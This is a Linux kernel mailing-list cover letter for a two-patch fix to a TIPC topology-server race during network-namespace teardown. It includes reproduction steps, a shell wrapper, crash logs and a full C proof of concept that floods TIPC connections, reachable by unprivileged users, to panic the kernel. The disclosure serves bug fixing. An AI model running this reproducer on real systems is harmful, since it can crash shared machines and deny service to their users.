Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C48C63AF66E
	for <stable@vger.kernel.org>; Mon, 21 Sep 2026 09:41:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789983686; cv=none; b=n/oS52UZzdVWCCO62zDj4vdyPSzFz6Dt83P1e8NNtl9rGYPL3UH6YYpd88m19VGQluTUygxE5SHZsbRUIMQqdUoMkB/frPbRRSvNQNbYOxyDrasiaPZ1HiMCr57SY5DfWp20Ku9nLn3Zv7dM4zKcPX4gjJGfH8N8HmqHXVIoN3I=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789983686; c=relaxed/simple;
	bh=M+WH6uUBHIWb/Spg6hglIR53tPV7XiIfhwPUdPw+vTo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JA3u1eoXOBDhpHy1/vYX5c2ViCj06cUjC5pQ9S5w+sAxYuVsEFoxAuUElrwDDL9TAMH+I4jSvkiShQuYtDZF8g0P/H4rxGWooI4UBWnW5f6CB+wdnu7lP+selsNs5g/n9rJXYR6rATnyZqh90U6ll/hVxxSzcEKTRDCqG25KmXE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HLa9RJyg; arc=none smtp.client-ip=74.125.228.12
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HLa9RJyg"
Received: by mail-pz2-f12.google.com with SMTP id 41be03b00d2f7-cc4c3304784so2363582a12.3
        for <stable@vger.kernel.org>; Mon, 21 Sep 2026 02:41:24 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789983684; x=1790588484; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=MwdT0PKcyb14xJmRM+G9azrrQGZyE9wKm1WPQ02dwXo=;
        b=HLa9RJygX4p4pPm7rulYbquUPUkO6cyn/XHonCGG2k3Oz/UPcXYruQ2nIF5Eq0dF/u
         dilDw/nUewLGY863vUcuWcwyLgBCfkdoOOLAWFPVfbNxCEZT4OGvJKXQFj8A4I2yJL+f
         Z4i1w78IXHuTHko8G1pcXW0EnrK0WvoD1ckXpuGrfXHDcD0kcUfNiC0LIebtCaXPUd2O
         Q5eGluo/jgai4oAxbccN/Z9j3QRnh2nj8HsJnGLeKNMfUVlq4HFfaM8/vigLxQKOcjDp
         Z7R6x6djRpZidpad8Rd1AmPlrRC61L1+OzZKYRgTY7+Sk5t/4Uh8wL1VH/GJelJBEBJX
         E90g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789983684; x=1790588484;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=MwdT0PKcyb14xJmRM+G9azrrQGZyE9wKm1WPQ02dwXo=;
        b=AlGdktKiwuc3jZntFma/51xw4WJTwFnclYvHdZ5EPLhOc/laULRJKqwygMuvczN18m
         Ju/d4doC1YcPP3P5C59FJ0IqBLu/oKrQ8DTKnYOD7mW3709wLdoUEzRWXCSQNAyfaFZ5
         FijZs04Dh0Ku6m0ioA7vpZQqBo3MMNPUKI64ZTs378gKA7wos3u8RvQkJNPQ/Vfdvek8
         X67Pw+ubT2nN6kGqGV2LuuyyDYMDJB+Ea4U8qyZN/KjVCS6q67jb6h1in1flNqR8Hegd
         BJPumgumx8utFRnGzwUc+9XVrWq63gvc9TaB05Vy+DxPcycGpvmEshzwAQitvrHU/HNP
         1stg==
X-Forwarded-Encrypted: i=1; AKwUvBwJ5twOegRTV1o5WYB0j37DAEKubes3eQ5ptPVUkN0m+jjx5s6SgHEe/88WAj+FftGT0sPpYsc=@vger.kernel.org
X-Gm-Message-State: AFuF++lafMvcqYFofh600ESjYGsjNyo4ZHygt0g2EYJ8k04vYpzkny0Y
	R2kZO2sXhIkvC1Qnz7ibccF/RmPknV8B5EjuNGQwHGirKKquACC5r+ki
X-Gm-Gg: AYBFou3v5fqXa2uFH2TRaat2tYSGP2MfNrUhbGIjdEYbqdGJUUCku9qaUXuC7mWt13O
	ORX53J6ayLzlzbV25gbbAS8cri74XNdc2g2bIzX7OKpf6rgKHO8Mf6t+z9hHbDaXPFeJHbSiINg
	h9qZvXLEA1PB0s8dSilMTF/bdua0Uc6ORg9rot1UU6+V70wJeHZgm24HBp7isavN2h6I4QgdM6o
	wUPVBJ0FjJy8sDTReRqFwNaYDN+eYMPjdcKap96mJerKwsg6lhbRo6LTHI30SnrMDzrGcZLbZ+2
	j6kwIsNL+q903lGPh4GkcEQGbdbjGdLPQq3IQAiAjcO14zRqzBBH8YwWCtorjYCWEBfDsS6dTst
	v6J4wVdVqPoCPUobFnp3fuLG2ZMmBkc8T0UHWg8yo8G3/tFA0RqxKHLXTDNT4Ddd0toYm1Ieril
	h/8O0LvE/Fw55zReflJi2hqdUoNRZak4FJRK5qNtce0ARuvPzkKtVA0pCnwjcUnJiy82QHr5v8T
	sS9/+9N7OYQngbUF2C/sQWgJRrz0XI7uWTN/hD7bEvecg+H1sqwSbY/yLBR6mJNy7eYxrpauiYh
	I+65
X-Received: by 2002:a17:903:ac7:b0:2dd:c053:e661 with SMTP id d9443c01a7336-2ddc053e6b9mr89096855ad.39.1789983683887;
        Mon, 21 Sep 2026 02:41:23 -0700 (PDT)
Received: from lenovo-thinkbook.lenovo.com (n112120123178.netvigator.com. [112.120.123.178])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ddc17a04afsm31053665ad.42.2026.09.21.02.41.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 21 Sep 2026 02:41:23 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: netdev@vger.kernel.org,
	Tung Quang Nguyen <tung.quang.nguyen@est.tech>
Cc: Jon Maloy <jmaloy@redhat.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Ying Xue <ying.xue@windriver.com>,
	Parthasarathy Bhuvaragan <parthasarathy.bhuvaragan@ericsson.com>,
	Kuniyuki Iwashima <kuniyu@google.com>,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH net v2 0/2] tipc: fix connection lifetime during netns teardown
Date: Mon, 21 Sep 2026 17:41:13 +0800
Message-ID: <cover.1789960909.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/tipc/topsrv.c. The bug is
reachable by an unprivileged user via user and network namespaces
(CLONE_NEWUSER|CLONE_NEWNET); the reproducer below also supports a
root mode.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

Changes in v2:
 - Add the exact reproduction command and the stack traces we observe
   to this changelog, as requested by Tung Quang Nguyen.
 - The patch content is unchanged; the series has only been rebased
   onto the current net/main tip.

Reproduction command (root mode, as used for the traces below):

  # 2 vCPU, 2 GB RAM x86_64 QEMU, kernel built from net/main
  # tip 1e24c4f2ee44 (7.3.0-rc3-00344-g1e24c4f2ee44), CONFIG_TIPC=y
  sysctl -w kernel.panic_on_rcu_stall=1
  echo 20 > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
  MODE=root ./poc.sh 6000 4 20000
  # i.e. ./poc -i 6000 -t 4 -r 20000

The bug is a race, so the reported trace is not deterministic; with
the command above it triggers within roughly 20 s in most runs.

Stack trace observed on the unpatched kernel (RCU stall):

[   20.832329] rcu: INFO: rcu_preempt detected stalls on CPUs/tasks:
[   20.833203] rcu: 	(detected by 0, t=20002 jiffies, g=-1003, q=11014 ncpus=2)
[   20.849696] Sending NMI from CPU 0 to CPUs 1:
[   20.850327] NMI backtrace for cpu 1
[   20.850330] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy)
[   20.850335] Workqueue: netns cleanup_net
[   20.850340] RIP: 0010:__radix_tree_lookup+0x1b/0xa0
[   20.850360] Call Trace:
[   20.850361]  <TASK>
[   20.850362]  tipc_topsrv_exit_net+0x8b/0x1a0
[   20.850369]  ops_undo_list+0xef/0x250
[   20.850372]  cleanup_net+0x1d2/0x330
[   20.850375]  process_one_work+0x197/0x390
[   20.850379]  worker_thread+0x169/0x2d0
[   20.850384]  kthread+0xe1/0x120
[   20.850393]  ret_from_fork_asm+0x1a/0x30
[   20.850398]  </TASK>
[   20.876630] Kernel panic - not syncing: RCU Stall
[   20.877303] CPU: 0 UID: 0 PID: 32 Comm: kworker/u8:1 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy)
[   20.880467] Workqueue: tipc_rcv tipc_topsrv_accept
[   20.892986] RIP: 0010:queued_spin_lock_slowpath+0x130/0x2b0
[   20.902581]  tipc_conn_alloc+0xaf/0x150
[   20.903126]  tipc_topsrv_accept+0x7d/0x170
[   20.905029]  process_one_work+0x197/0x390
[   20.905595]  worker_thread+0x169/0x2d0
[   20.906129]  ? __pfx_worker_thread+0x10/0x10
[   20.906729]  kthread+0xe1/0x120
[   20.908765]  ret_from_fork_asm+0x1a/0x30
[   20.909326]  </TASK>

Second failure mode, same command, different run (~5 s in):

[    5.368491] Workqueue: tipc_rcv tipc_topsrv_accept
[    5.368499] Call Trace:
[    5.368560]  tipc_sk_create+0x96/0x840
[    5.368568]  tipc_accept+0xca/0x380
[    5.368580]  tipc_topsrv_accept+0x69/0x170
[    5.368758] Out of memory and no killable processes...
[    5.368759] Kernel panic - not syncing: System is deadlocked on memory

Why different stack traces are seen:

The series fixes two independent lifetime problems in the same teardown
path, and which one is reported first depends on how the race resolves:

 1/2 - the listener is stopped too late. Its data-ready callback and
       sk_user_data remain installed while the workqueues are
       destroyed, so accept work can still be queued/run while the
       netns is being torn down. The "deadlocked on memory" trace above
       is one visible outcome: tipc_topsrv_accept() keeps allocating
       connections through tipc_accept()/tipc_sk_create() while netns
       cleanup cannot complete.

 2/2 - the conn_idr teardown walk scans numeric IDs while holding
       idr_lock, so the final conn_put() of a connection (which reaches
       tipc_conn_kref_release() and takes idr_lock) cannot make
       progress. This is the RCU stall above. The exact frame in the
       stall depends on where the timer interrupt lands inside
       tipc_topsrv_exit_net() (we have seen +0x78, +0x8b and +0x8e,
       plus __radix_tree_lookup for the inlined idr_find()) and on the
       task running on the other CPU (tipc_topsrv_accept(),
       tipc_conn_alloc(), tipc_conn_kref_release() or
       tipc_conn_recv_work()).

So a different trace is expected and is not a different bug. Both are
addressed by this series. If you still see a trace that does not match
either pattern, could you please share your exact command line
(/proc/cmdline), the kernel version/base and the full trace?

 - v1 Link: https://lore.kernel.org/all/cover.1789722780.git.xuyuqiabc@gmail.com/

---- details below ----

Bug details:

`tipc_topsrv_stop()` can tear the topology server down in two unsafe
ways. It destroys `srv->rcv_wq`/`srv->send_wq` while the listener
socket still has its data-ready callback and `sk_user_data` installed,
so `tipc_topsrv_listener_data_ready()` can still queue `srv->awork` on
a freed workqueue. It also walks `conn_idr` by incrementing a numeric
ID while holding `idr_lock`, which can scan a large range of unused IDs
without letting a connection's final reference release make progress,
and it can resurrect an entry whose last reference was already dropped.

Reproducer:

#!/bin/sh
set -eu

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"

ITERATIONS="${1:-6000}"
THREADS="${2:-4}"
RUNTIME_USEC="${3:-20000}"
MODE="${MODE:-root}"              # root | userns
STALL_TIMEOUT="${STALL_TIMEOUT:-20}"
CC_BIN="${CC:-gcc}"

cd "$SCRIPT_DIR"

"$CC_BIN" -O2 -Wall -pthread -o poc poc.c

if [ "${SET_PANIC_ON_RCU_STALL:-1}" = "1" ] && [ "$(id -u)" -eq 0 ]; then
	sysctl -w kernel.panic_on_rcu_stall=1 >/dev/null 2>&1 || true
	if [ -w /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout ]; then
		echo "$STALL_TIMEOUT" > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
	fi
fi

if [ "$MODE" = "userns" ]; then
	CMD="./poc --userns -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
else
	CMD="./poc -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
fi

echo "[*] running: $CMD"
exec sh -c "$CMD"


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------


#define _GNU_SOURCE

#include <errno.h>
#include <getopt.h>
#include <linux/tipc.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static atomic_int stop_flag;

struct run_cfg {
	int iterations;
	int threads;
	int runtime_usec;
	int ns_flags;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-i iterations] [-t threads] [-r runtime_usec] [--userns]\n"
		"  -i, --iterations   number of fork/teardown cycles (default: 6000)\n"
		"  -t, --threads      flood worker threads per cycle (default: 4)\n"
		"  -r, --runtime-us   worker runtime per cycle in usec (default: 20000)\n"
		"  -U, --userns       use CLONE_NEWUSER|CLONE_NEWNET (for non-root)\n",
		prog);
}

static void parse_args(int argc, char **argv, struct run_cfg *cfg)
{
	static const struct option long_opts[] = {
		{ "iterations", required_argument, NULL, 'i' },
		{ "threads", required_argument, NULL, 't' },
		{ "runtime-us", required_argument, NULL, 'r' },
		{ "userns", no_argument, NULL, 'U' },
		{ "help", no_argument, NULL, 'h' },
		{ 0, 0, 0, 0 },
	};
	int c;

	cfg->iterations = 6000;
	cfg->threads = 4;
	cfg->runtime_usec = 20000;
	cfg->ns_flags = CLONE_NEWNET;

	while ((c = getopt_long(argc, argv, "i:t:r:Uh", long_opts, NULL)) != -1) {
		switch (c) {
		case 'i':
			cfg->iterations = atoi(optarg);
			break;
		case 't':
			cfg->threads = atoi(optarg);
			break;
		case 'r':
			cfg->runtime_usec = atoi(optarg);
			break;
		case 'U':
			cfg->ns_flags = CLONE_NEWUSER | CLONE_NEWNET;
			break;
		case 'h':
		default:
			usage(argv[0]);
			exit(c == 'h' ? 0 : 1);
		}
	}

	if (cfg->iterations <= 0 || cfg->threads <= 0 || cfg->runtime_usec < 0) {
		usage(argv[0]);
		exit(1);
	}
}

static void *flood_worker(void *arg)
{
	uintptr_t tid = (uintptr_t)arg;
	struct sockaddr_tipc sa;
	struct tipc_subscr sub;

	memset(&sa, 0, sizeof(sa));
	sa.family = AF_TIPC;
	sa.addrtype = TIPC_SERVICE_ADDR;
	sa.scope = TIPC_NODE_SCOPE;
	sa.addr.name.name.type = TIPC_TOP_SRV;
	sa.addr.name.name.instance = TIPC_TOP_SRV;

	memset(&sub, 0, sizeof(sub));
	sub.seq.type = 0x20000 + (uint32_t)tid;
	sub.seq.lower = 1;
	sub.seq.upper = 1;
	sub.timeout = 0xffffffffu;
	sub.filter = TIPC_SUB_SERVICE;

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		int fd = socket(AF_TIPC, SOCK_SEQPACKET | SOCK_NONBLOCK, 0);

		if (fd < 0)
			continue;

		(void)connect(fd, (struct sockaddr *)&sa, sizeof(sa));
		(void)send(fd, &sub, sizeof(sub), MSG_DONTWAIT);
		close(fd);
	}

	return NULL;
}

static void run_one_iteration(const struct run_cfg *cfg)
{
	pthread_t *tids;
	int i;

	if (unshare(cfg->ns_flags) < 0)
		_exit(111);

	tids = calloc((size_t)cfg->threads, sizeof(*tids));
	if (!tids)
		_exit(1);

	atomic_store_explicit(&stop_flag, 0, memory_order_relaxed);
	for (i = 0; i < cfg->threads; i++)
		pthread_create(&tids[i], NULL, flood_worker,
			       (void *)(uintptr_t)(i + 1));

	usleep((useconds_t)cfg->runtime_usec);

	_exit(0);
}

int main(int argc, char **argv)
{
	struct run_cfg cfg;
	int i;
	int ns_failures = 0;

	parse_args(argc, argv, &cfg);

	for (i = 0; i < cfg.iterations; i++) {
		pid_t pid = fork();
		int st;

		if (pid == 0)
			run_one_iteration(&cfg);
		if (pid < 0)
			return 1;

		if (waitpid(pid, &st, 0) < 0)
			return 1;

		if (WIFEXITED(st) && WEXITSTATUS(st) == 111)
			ns_failures++;

		if ((i % 200) == 0)
			fprintf(stderr, "iter=%d ns_failures=%d\n", i, ns_failures);
	}

	if (ns_failures == cfg.iterations) {
		fprintf(stderr,
			"all iterations failed to create namespaces (EPERM likely)\n");
		return 2;
	}

	return 0;
}


------END poc.c--------

----BEGIN crash log----


[  292.540819][    C1] rcu: INFO: rcu_preempt self-detected stall on CPU
[  292.647997][    C1] Workqueue: tipc_rcv tipc_topsrv_accept
[  292.708934][    C0] Workqueue: netns cleanup_net
[  292.709097][    C0]  <TASK>
[  292.709101][    C0]  __radix_tree_lookup+0xb7/0x290
[  292.709134][    C0]  tipc_topsrv_exit_net+0x19c/0x4e0
[  292.709169][    C0]  ops_exit_list+0xc0/0x180
[  292.709192][    C0]  cleanup_net+0x5b9/0xbd0
[  292.709217][    C0]  process_one_work+0x981/0x1930
[  292.709275][    C0]  worker_thread+0x729/0x10e0
[  292.709314][    C0]  kthread+0x338/0x410
[  292.709364][    C0]  ret_from_fork_asm+0x11/0x20
[  292.709383][    C0]  </TASK>
[  292.831321][    C1] Kernel panic - not syncing: RCU Stall
[  292.834975][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996)
[  292.839167][    C1] Call Trace:
[  292.875653][    C1]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  292.906505][    C1]  tipc_topsrv_accept+0x104/0x300
[  292.909515][    C1]  process_one_work+0x981/0x1930
[  292.919937][    C1]  ret_from_fork+0x4b/0x80
[  292.926345][    C1] Kernel Offset: disabled
[  292.927571][    C1] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (2):
  tipc: stop the listener before draining connections
  tipc: make conn_idr teardown safe

 net/tipc/topsrv.c | 27 ++++++++++++++++++++-------
 1 file changed, 20 insertions(+), 7 deletions(-)


base-commit: 1e24c4f2ee44be0eee94092b5d13cbdb4bdf0d60
-- 
2.55.0
